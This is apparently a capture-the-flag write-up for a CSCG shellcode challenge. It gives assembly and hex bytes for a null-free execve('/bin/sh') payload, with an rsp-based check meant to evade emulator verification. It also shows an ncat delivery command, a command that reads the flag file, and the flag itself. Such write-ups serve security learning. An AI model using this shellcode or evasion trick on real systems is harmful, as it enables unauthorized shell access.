### ID: torukmagto

# Shellcode Payload
## Approach
Since ``rsp = 0x7FFFFF`` initially during emulation, the probability that this holds during actual execution after emulation check should be low. 
We exploit this by creating a simple check at the beginning. The actual challenge is to find a set of instructions
such that it does not contain `\x00` until the very end, since the input is read until `\x00` in [main.rs](./code/main.rs).
Luckily, the actual shellcode payload which creates a new shell process does not contain any `\x00`.
## Assembler
````asm
mov rbx, rsp    ; rbx = 0x7FFFFF
shr rbx, 16
cmp bl, 0x7F
je __bypass_verification

push   0x42     ; shellcode for '/bin/sh exec' from https://shell-storm.org/shellcode/files/shellcode-905.html
pop    rax
inc    ah
cqo
push   rdx
movabs rdi, 0x68732f2f6e69622f
push   rdi
push   rsp
pop    rsi
mov    r8, rdx
mov    r10, rdx
syscall

__bypass_verification:
nop

; bytecode hex: 4889E348C1EB1080FB7F741D6A4258FEC448995248BF2F62696E2F2F736857545E4989D04989D20F0590(00)   
````

## Payload Delivery
```shell
echo -ne "\x48\x89\xE3\x48\xC1\xEB\x10\x80\xFB\x7F\x74\x1D\x6A\x42\x58\xFE\xC4\x48\x99\x52\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5E\x49\x89\xD0\x49\x89\xD2\x0F\x05\x90\x00 > payload.txt
cat payload.txt - | ncat -v --ssl <challenge_ip> <port>
> cat /home/ctf/flag
```

# Flag
`CSCG{w4sn7_s0_s3cur3_4f3r_al1_huh}`
